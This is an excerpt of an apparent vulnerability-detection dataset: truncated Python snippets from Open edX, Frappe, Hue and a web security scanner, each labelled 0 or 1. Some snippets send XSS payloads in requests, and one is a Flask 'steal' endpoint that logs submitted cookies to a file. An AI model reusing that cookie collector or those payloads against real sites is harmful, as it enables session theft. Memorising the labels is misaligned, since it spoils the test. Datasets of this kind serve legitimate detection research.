Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with", "label": 0}, {"snippet_id": 4257, "code": " vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method", "label": 0}, {"snippet_id": 15187, "code": " TestSuite for running Bok Choy tests Properties(below is a subset): test_dir -parent directory for tests log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related to", "label": 0}, {"snippet_id": 3401, "code": "': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if result is not True: decoded_payload=xss_payload_decode(payload) if xss_request_url", "label": 0}, {"snippet_id": 15610, "code": " courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that have courses in them. For example, if the course is located in `test_root/courses/test-example-course", "label": 0}, {"snippet_id": 17623, "code": "'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change", "label": 0}, {"snippet_id": 2984, "code": ": result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid", "label": 0}, {"snippet_id": 34344, "code": " value) \tdef get_db_value(self, key): \t\treturn frappe.db.get_value(self.doctype, self.name, key) \tdef get(self, key=None, filters=None, limit=None, default=None): \t\tif key: \t\t\tif isinstance(key, dict): \t", "label": 0}, {"snippet_id": 52114, "code": ".check_workspace(request.fs, request.user) workflow_data=workflow.get_data() api=get_oozie(request.user) credentials=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e", "label": 0}, {"snippet_id": 8902, "code": "'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create", "label": 0}, {"snippet_id": 44794, "code": " parameters=parameters.union(set(Node(node_data).find_parameters())) script_path=node_data.get('properties',{}).get('script_path',{}) if script_path: script_path=script_path.replace('hdfs://', '') if request", "label": 0}, {"snippet_id": 32219, "code": "(__file__)) SRC_DIR=os.path.dirname(os.path.dirname(THIS_DIR)) sys.path.insert(0, os.path.join(SRC_DIR, 'third_party', 'Python-Markdown')) import markdown def main(argv): parser=argparse.ArgumentParser", "label": 0}, {"snippet_id": 44804, "code": "}) if script_path: script_path=script_path.replace('hdfs://', '') if request.fs.do_as_user(request.user, request.fs.exists, script_path): data=request.fs.do_as_user(request.user, request.fs.read, script_path", "label": 0}, {"snippet_id": 33871, "code": ") def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route)", "label": 0}, {"snippet_id": 40487, "code": "._dict() \t\tif cache_key not in self._precision: \t\t\tself._precision[cache_key]=frappe._dict() \t\tif fieldname not in self._precision[cache_key]: \t\t\tself._precision[cache_key][fieldname]=None \t\t\tdoctype=self", "label": 0}, {"snippet_id": 8172, "code": "'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$", "label": 0}, {"snippet_id": 29514, "code": "+line_class+'\">' +escape_html(line) +'</div>') \t\t\t def show_ip(stdout): \tfor line in stdout: \t\tprint(line) \t\t def server_status(stdout):\t \tproc_count=\"\" \t \tfor line in stdout: \t\tif \"Ncat: \" not in line:", "label": 0}, {"snippet_id": 46773, "code": " from.react import ReactMixin, ReactItem from.signals import comment_reacted from.utils import RedisSettings markdown=mistune.Markdown() MC_KEY_COMMENT_LIST='comment:%s:comment_list' MC_KEY_N_COMMENTS=", "label": 0}, {"snippet_id": 23359, "code": "', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete", "label": 0}, {"snippet_id": 13602, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name", "label": 0}, {"snippet_id": 40750, "code": "\t \t\t\t\tref_doc=frappe.new_doc(self.doctype) \t\t\telse: \t\t\t\t \t\t\t\tif self.get('parent_doc'): \t\t\t\t\tself.parent_doc.get_latest() \t\t\t\t\tref_doc=[d for d in self.parent_doc.get(self.parentfield) if d.name==self.name", "label": 0}, {"snippet_id": 51649, "code": ".get('DB_ENGINE', 'mysql'),{}) } } DATABASE=os.environ.get('DJANGO_DATABASE', 'dev') DATABASES={'default': DATABASES_SETTINGS[DATABASE]} AUTH_PASSWORD_VALIDATORS=[ { 'NAME': 'django.contrib.auth.password_validation", "label": 0}, {"snippet_id": 22695, "code": " url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r", "label": 0}, {"snippet_id": 27163, "code": ")\\s[^\\>]*value=\"(\\w+)\"', line, re.M|re.I) if m_value: hidden_param_name.append(m_input.group(2)) hidden_param_value.append(m_value.group(2)) else: params.append(m_input.group(2)) m_same =re.match(r'.*\\", "label": 1}, {"snippet_id": 44857, "code": ", e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def workflow_parameters(request): response={'status': -1} try:", "label": 0}, {"snippet_id": 26375, "code": " self.instance.vat_id_validated=False if self.request and self.vat_warning: messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of ' 'your country returned an", "label": 0}, {"snippet_id": 4248, "code": " vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are", "label": 0}, {"snippet_id": 16894, "code": "\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^", "label": 0}, {"snippet_id": 33675, "code": ".comment_list))==1: \t\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", ", "label": 0}, {"snippet_id": 30763, "code": "\"_blank\">Look it</a> or <a href=\"edit.py\" title=\"Edit\">Edit something else</a></h3><br />' %(enable, backend, serv, serv)) \t\t\t \tfunct.ssh_command(serv, command, show_log=\"1\") \taction='edit.py ' +enable +' '", "label": 0}, {"snippet_id": 34692, "code": " isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float): \t\t\t\t\td[fieldname]=flt(d[fieldname]) \t\t\t", "label": 0}, {"snippet_id": 10967, "code": " num_processors and verbosity. Quitting' raise BuildFailure(msg) if self.num_processes !=1: substring=[ \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"-", "label": 0}, {"snippet_id": 39686, "code": " \t\t'''Returns list of invalid links and also updates fetch values if not set''' \t\tdef get_msg(df, docname): \t\t\tif self.parentfield: \t\t\t\treturn \"{} \t\t\telse: \t\t\t\treturn \"{}:{}\".format(_(df.label), docname", "label": 0}, {"snippet_id": 39472, "code": "\tfieldname, label=str(e).split(\"'\")[-2], None \t\t \t\t \t\tif \"unique_\" in fieldname: \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0}", "label": 0}, {"snippet_id": 42559, "code": "\"Duplicate\" in cstr(e.args[1]): \t\t\t\tself.show_unique_validation_message(e) \t\t\telse: \t\t\t\traise \tdef show_unique_validation_message(self, e): \t\ttype, value, traceback=sys.exc_info() \t\tfieldname, label=str(e", "label": 0}, {"snippet_id": 45195, "code": " raise PopupException(_('You don\\'t have access to the workflow of this coordinator.')) return render('editor/coordinator_editor.mako', request,{ 'coordinator_json': coordinator.json, 'credentials_json':", "label": 1}, {"snippet_id": 39088, "code": ".fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d[fieldname],(datetime.datetime, datetime.time, datetime.timedelta)): \t", "label": 0}, {"snippet_id": 6973, "code": ".register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(", "label": 0}, {"snippet_id": 27751, "code": "'Content-Type']='application/json' self.before_render_json(values, status) self.response.out.write(json.dumps(values, cls=JsonEncoder)) self.response.set_status(status) def handle_exception(self, exception, _", "label": 0}, {"snippet_id": 26145, "code": " self.all_optional, scheme=event.settings.name_scheme, label=_('Name'), initial=(self.instance.name_parts if self.instance else self.instance.name_parts), ) if event.settings.invoice_address_required and", "label": 0}, {"snippet_id": 53928, "code": "['GET','POST']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n-------------", "label": 0}, {"snippet_id": 12967, "code": " settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=(", "label": 0}, {"snippet_id": 14444, "code": "<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get", "label": 0}, {"snippet_id": 424, "code": "'%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url==''", "label": 0}, {"snippet_id": 34186, "code": ".db.get_value(\"DocType\", doctype,(\"module\", \"custom\"), cache=True) \\ \t\t\tor[\"Core\", False] \t\tif custom: \t\t\t_class=Document \t\telse: \t\t\tmodule=load_doctype_module(doctype, module_name) \t\t\tclassname=doctype", "label": 0}, {"snippet_id": 8116, "code": "+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 45286, "code": "=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2') if coordinator_data['properties']['workflow']: dependencies=Document2.objects.filter(type='oozie", "label": 0}, {"snippet_id": 8123, "code": "\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware", "label": 0}, {"snippet_id": 16130, "code": " 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login", "label": 0}, {"snippet_id": 37864, "code": " make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self):", "label": 0}, {"snippet_id": 2524, "code": " body\",temp_body xss_post_request=req.api_request(url, \"POST\", headers, temp_body) decoded_payload=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact", "label": 1}, {"snippet_id": 24335, "code": " collectstatic) serversonly -prepare and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and run tests with no setup or cleaning", "label": 0}, {"snippet_id": 53438, "code": "=bundle_data['name'], uuid=bundle_data['uuid'], type='oozie-bundle2', owner=request.user) Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra=", "label": 0}, {"snippet_id": 52052, "code": " list_editor_workflows(request): workflows=[d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] return render('editor/list_editor_workflows.mako',", "label": 0}, {"snippet_id": 31908, "code": "'color')+' list was uploaded to '+server[1]+'</div>') \t\t\tif form.getvalue('bwlists_restart')=='restart': \t\t\t\tfunct.ssh_command(server[2],[\"sudo \" +sql.get_setting('restart_command')]) \t\t\t if form.getvalue", "label": 0}, {"snippet_id": 13213, "code": "/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done", "label": 0}, {"snippet_id": 50474, "code": ".requests[csessid]=request return server.NOT_DONE_YET def mode_close(self, request): \"\"\" This is called by render_POST when the client is signalling that it is about to be closed. Args: request(Request", "label": 0}, {"snippet_id": 28122, "code": "/html\\n') funct.check_login() form=cgi.FieldStorage() serv=form.getvalue('serv') config_read=\"\" cfg=\"\" stderr=\"\" error=\"\" aftersave=\"\" try: \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) ", "label": 0}, {"snippet_id": 50617, "code": " super(AjaxWebClientSession, self).__init__(*args, **kwargs) def get_client_session(self): \"\"\" Get the Client browser session(used for auto-login based on browser session) Returns: csession(ClientSession)", "label": 0}, {"snippet_id": 47224, "code": " menu_items assert menu_items['Records'].is_category() submenu_items={ str(item.name): item for item in menu_items['Records'].get_children()} assert 'Record Metadata' in submenu_items assert isinstance", "label": 0}, {"snippet_id": 35348, "code": ".parentfield: \t\t\t\treturn \"{} \t\t\telse: \t\t\t\treturn \"{}:{}\".format(_(df.label), docname) \t\tinvalid_links=[] \t\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields() \t\t\t\t+self.meta.get(\"fields\",{\"fieldtype\":('=", "label": 0}, {"snippet_id": 2357, "code": " result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid", "label": 0}, {"snippet_id": 32681, "code": "() if(line.startswith(' not line.startswith(' md.treeprocessors['adjust_toc']=_AdjustTOC(has_a_single_h1) md_fragment=md.convert(contents).encode('utf-8') try: self._WriteHeader('text/html') self._WriteTemplate", "label": 0}, {"snippet_id": 29382, "code": "\terror +=str(upload(serv, tmp_file, cfg, dir='fullpath')) \ttry: \t\terror +=ssh_command(serv, commands) \texcept Exception as e: \t\terror +=e \tif error: \t\treturn error \t\t def open_port_firewalld(cfg): \ttry: ", "label": 0}, {"snippet_id": 23788, "code": "._expected_command(name=name)) def test_suite_spec(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)", "label": 0}, {"snippet_id": 25654, "code": "=[a for a in pos.answerlist if a.question_id==q.id] if answers: initial=answers[0] else: initial=None tz=pytz.timezone(event.settings.timezone) help_text=rich_text(q.help_text) if q.type==Question.TYPE_BOOLEAN", "label": 0}, {"snippet_id": 15401, "code": ".makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking for mongo, memchache, and mysql...", "label": 0}, {"snippet_id": 13946, "code": ".get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade", "label": 0}, {"snippet_id": 13405, "code": "{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key", "label": 0}, {"snippet_id": 42684, "code": ".docstatus is not None: \t\t\tself.docstatus=cint(self.docstatus) \tdef _get_missing_mandatory_fields(self): \t\t\"\"\"Get mandatory fields that do not have any values\"\"\" \t\tdef get_msg(df): \t\t\tif df.fieldtype==\"Table\": ", "label": 0}, {"snippet_id": 19747, "code": " Properties(below is a subset): test_dir -parent directory for tests log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory", "label": 0}, {"snippet_id": 27788, "code": " status, 'type': exception.__class__.__name__ } if isinstance(exception, helpers.EarlyExitException): status=exception.status values=exception.to_dict() values['params']=self.request.params.dict_of_lists()", "label": 0}, {"snippet_id": 37328, "code": " Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe", "label": 0}, {"snippet_id": 21102, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch", "label": 0}, {"snippet_id": 20425, "code": "{ \"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url", "label": 0}, {"snippet_id": 29505, "code": " \t\tline_class=\"line3\" if i % 2==0 else \"line\" \t\tprint('<div class=\"'+line_class+'\">' +escape_html(line) +'</div>') \t\t\t def show_ip(stdout): \tfor line in stdout: \t\tprint(line) \t\t def server_status(stdout", "label": 0}, {"snippet_id": 38490, "code": ".utils.password import get_decrypted_password, set_encrypted_password _classes={} def get_controller(doctype): \t\"\"\"Returns the **class** object of the given DocType. \tFor `custom` type, returns `frappe", "label": 0}, {"snippet_id": 10230, "code": "'', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS', 'True') with", "label": 1}, {"snippet_id": 21313, "code": "/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)", "label": 1}, {"snippet_id": 34104, "code": " now, cstr, strip_html, \tsanitize_html, sanitize_email, cast_fieldtype) from frappe.model import default_fields from frappe.model.naming import set_new_name from frappe.model.utils.link_count import notify_link_count", "label": 0}, {"snippet_id": 3384, "code": " '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url", "label": 0}, {"snippet_id": 12549, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 39381, "code": " \t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e) \t\t\t\telif \"Duplicate\" in cstr(e.args[1]): \t\t\t\t\t \t\t\t\t\tself.show_unique_validation_message(e) \t\t\t\telse: \t\t\t\t\traise \t\t\telse: \t\t\t\traise \t\tself", "label": 0}, {"snippet_id": 38860, "code": ", 'DocField')): \t\t\t\treturn value \t\t\traise ValueError( \t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not{2}({3})'.format(key, \t\t\t\t\tself.name, str(type(value", "label": 0}, {"snippet_id": 35227, "code": ")) \t\tif self.docstatus is not None: \t\t\tself.docstatus=cint(self.docstatus) \tdef _get_missing_mandatory_fields(self): \t\t\"\"\"Get mandatory fields that do not have any values\"\"\" \t\tdef get_msg(df): \t\t\tif df", "label": 0}, {"snippet_id": 19303, "code": ") self.assertEqual( suite.cmd, self._expected_command(name=name, store='draft') ) def test_invalid_default_store(self): suite=BokChoyTestSuite('', default_store='invalid') name='tests' self.assertEqual", "label": 0}, {"snippet_id": 41705, "code": " \"_table_fields\", \"_valid_columns\") \tdef __init__(self, d): \t\tself.update(d) \t\tself.dont_update_if_missing=[] \t\tif hasattr(self, \"__setup__\"): \t\t\tself.__setup__() \t@property \tdef meta(self): \t\tif not hasattr", "label": 0}, {"snippet_id": 20943, "code": ".render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render'", "label": 0}, {"snippet_id": 51947, "code": ") +'/') if DEBUG: DATA_UPLOAD_MAX_NUMBER_FIELDS=10000 STATICFILES_FINDERS=( 'django.contrib.staticfiles.finders.FileSystemFinder', 'django.contrib.staticfiles.finders.AppDirectoriesFinder', 'compressor", "label": 0}, {"snippet_id": 37878, "code": "+self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro", "label": 0}, {"snippet_id": 37553, "code": "\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t", "label": 0}, {"snippet_id": 28870, "code": ".BadHostKeyException as badHostKeyException: \t\treturn 'Unable to verify server\\'s host key: %s ' % badHostKeyException \t\tpass \texcept Exception as e: \t\tif e==\"No such file or directory\": \t\t\treturn '%s. Check ssh", "label": 0}, {"snippet_id": 46599, "code": " request required.')) collections=json.loads(request.POST.get('collections')) searcher=DashboardController(request.user) response={ 'result': searcher.copy_collections([collection['id'] for collection in", "label": 0}, {"snippet_id": 40600, "code": ") \tdef is_print_hide(self, fieldname, df=None, for_print=True): \t\t\"\"\"Returns true if fieldname is to be hidden for print. \t\tPrint Hide can be set via the Print Format Builder or in the controller as a list", "label": 0}, {"snippet_id": 38293, "code": "%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t", "label": 0}, {"snippet_id": 35296, "code": ") in(None,[]) or not strip_html(cstr(self.get(df.fieldname))).strip(): \t\t\t\tmissing.append((df.fieldname, get_msg(df))) \t\t \t\tif self.meta.istable: \t\t\tfor fieldname in(\"parent\", \"parenttype\"): \t\t\t\tif not", "label": 0}, {"snippet_id": 17221, "code": "=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns", "label": 0}, {"snippet_id": 37447, "code": ":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children", "label": 0}, {"snippet_id": 44729, "code": "', '{}')) copied_properties=json.loads(request.POST.get('copiedProperties', '{}')) _properties=dict(NODES[node['widgetType']].get_fields()) _properties.update(dict([(_property['name'], _property['value", "label": 0}, {"snippet_id": 15351, "code": ".get('num_processes', DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False)) self.extra_args=kwargs.get('extra_args', '') self.har_dir=self.log_dir / 'hars", "label": 1}, {"snippet_id": 22284, "code": "\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change", "label": 0}, {"snippet_id": 43671, "code": ".model.meta import get_default_df \t\t\tdf=get_default_df(fieldname) \t\tval=self.get(fieldname) \t\tif translated: \t\t\tval=_(val) \t\tif absolute_value and isinstance(val,(int, float)): \t\t\tval=abs(self.get(fieldname", "label": 0}, {"snippet_id": 39446, "code": ") +[name]) \t\texcept Exception as e: \t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]): \t\t\t\tself.show_unique_validation_message(e) \t\t\telse: \t\t\t\traise \tdef show_unique_validation_message(self, e):", "label": 0}, {"snippet_id": 40818, "code": "\tif self.doctype !=\"DocType\": \t\t\tfor df in self.meta.get(\"fields\",{\"fieldtype\":('=', \"Text Editor\")}): \t\t\t\textract_images_from_doc(self, df.fieldname) def _filter(data, filters, limit=None): \t\"\"\"pass filters", "label": 0}, {"snippet_id": 43379, "code": " value): \t\t\t\t \t\t\t\tcontinue \t\t\telif \"<!--markdown -->\" in value and not(\"<script\" in value or \"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tsanitized_value=value \t\t\tif", "label": 0}, {"snippet_id": 6474, "code": " @property def sso_session_lifetime(self): \"\"\" Lifetime of SSO session(in minutes). If a user has an active SSO session, they will get SAML assertions made without having to authenticate again(unless SP", "label": 0}, {"snippet_id": 13813, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter", "label": 0}, {"snippet_id": 52681, "code": "=request.GET.get('uuid'))) response['status']=0 response['parameters']=workflow.find_all_parameters(with_lib_path=False) except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response", "label": 0}, {"snippet_id": 7881, "code": " 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service", "label": 0}, {"snippet_id": 6573, "code": ", pkg2:foo :return: list of(pkg, path) tuples \"\"\" if self._parsed_content_packages: return self._parsed_content_packages value=self.config.get(self.section, 'content_packages') res=[] for this in value", "label": 0}, {"snippet_id": 18523, "code": "', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list", "label": 0}, {"snippet_id": 54708, "code": " self.object=self.get_object() form=self.get_form() if form.is_valid(): return self.form_valid(form) else: return self.form_invalid(form) def form_valid(self, form): a=form.save(commit=False) a.author=self", "label": 0}, {"snippet_id": 44638, "code": " response['message']=_('Page saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def new_node(request): response={'status': -1} node=json.loads(request.POST.get('node', '{}", "label": 0}, {"snippet_id": 33809, "code": "\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings", "label": 0}, {"snippet_id": 32138, "code": "\" q=filter_string.lower() return[mapping for mapping in mappings if q in mapping.ud.lower()] def get_rules_as_json(mapping): rules=getattr(mapping, 'rules', None) if rules: rules=json.dumps(rules, indent", "label": 0}, {"snippet_id": 46000, "code": "\"card card-widget span12\"}]}], \"drops\":[\"temp\"],\"klass\":\"card card-home card-column span10\"}, ] def index(request, is_mobile=False): hue_collections=DashboardController(request.user).get_search_collections", "label": 0}, {"snippet_id": 42812, "code": ") \t\tinvalid_links=[] \t\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields() \t\t\t\t+self.meta.get(\"fields\",{\"fieldtype\":('=', \"Dynamic Link\")})): \t\t\tdocname=self.get(df.fieldname) \t\t\tif docname: \t\t\t", "label": 0}, {"snippet_id": 16255, "code": "'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=", "label": 0}, {"snippet_id": 10097, "code": " self).setUp() self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command", "label": 0}, {"snippet_id": 53106, "code": " for doc in dependencies: doc.doc.get().can_read_or_exception(request.user) coordinator_doc.dependencies=dependencies coordinator_doc.update_data(coordinator_data) coordinator_doc.name=coordinator_data", "label": 0}, {"snippet_id": 19016, "code": "'ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'", "label": 0}, {"snippet_id": 42014, "code": "\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn value \t\tif not isinstance(value, BaseDocument): \t\t\tif \"doctype\" not in 